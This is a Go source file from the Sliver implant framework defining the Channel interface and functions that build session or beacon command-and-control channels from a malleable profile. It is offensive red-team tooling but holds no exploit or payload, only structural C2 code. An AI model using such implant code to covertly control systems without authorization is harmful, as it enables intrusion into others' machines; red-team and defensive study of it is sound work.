package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Channel - A channel represents an complete C2 implementation, with transport and/or session layer connections,
// TLV/RPC messaging systems, additional Comm/Network subsystems (routing & network tools) available depending on the
// core type of the Channel: session or beacon. All information needed for the Channel to operate is contained in its Profile.
type Channel interface {

	// Transport Driver, and self-implemented functions
	Transport() *transports.Driver                       // The underlying base Transport, acting as the driver for the channel
	Profile() *pb.Malleable                              // Profile driving the behavior/type of any C2 Channel transport.
	Register([]*pb.Transport) *pb.Envelope               // Send a first registration message to the server (all types)
	RegisterSwitch(string, []*pb.Transport) *pb.Envelope // Send a transport switch registration message

	// Specialized Channel types implementations (Sessions/Beacons implement them)
	Start() error            // Start the Channel C2 stack: initial transport, session and related
	Serve(chan error)        // Serve handlers for the corresponding Channel type (session/beacon)
	Send(*pb.Envelope) error // Send a message back to the server, without prior request
	Close() error            // Shutdown the Channel and all its components
}

// InitChannel - Main/root instantiation function for all C2 Channels in the implant.
// Given a Malleable profile as bytes, will create and populate the appropriate underlying
// type of Channel (Session/Beacon) with all of its specified transport stack and settings.
func InitChannel(profileData string) (ch Channel, err error) {

	// Instantiate the base transport: this type fulfills part of
	// the Channel implementation, stores the C2 Profile, keeps
	// track of the Channel state, and manages the lower part of
	// a transport stack: physical connections when the C2 needs one.
	transport, err := transports.NewTransportFromBytes(profileData)
	if err != nil {
		return nil, fmt.Errorf("Failed to instantiate base transport: %s", err)
	}

	// Instantiate the Channel specialized type. Note that the session
	// type is actually used in both cases under the hood. See the types'
	// code documentation and implementation if needed.
	switch transport.Type {
	case pb.C2Type_Session:
		ch = NewSession(transport)
	case pb.C2Type_Beacon:
		ch = NewBeacon(transport)
	}

	return
}

// InitChannelFromProfile - Performs the same instantiation work as InitChannel(),
// except that we are being passed a Malleable profile to use as reference.
func InitChannelFromProfile(p *sliverpb.Malleable) (ch Channel, err error) {

	// Instantiate the transport driver
	transport, err := transports.NewTransportFromProfile(p)
	if err != nil {
		return nil, fmt.Errorf("Failed to instantiate base transport: %s", err)
	}

	// Instantiate the Channel specialized type. Note that the session
	// type is actually used in both cases under the hood. See the types'
	// code documentation and implementation if needed.
	switch transport.Type {
	case pb.C2Type_Session:
		ch = NewSession(transport)
	case pb.C2Type_Beacon:
		ch = NewBeacon(transport)
	}

	return
}
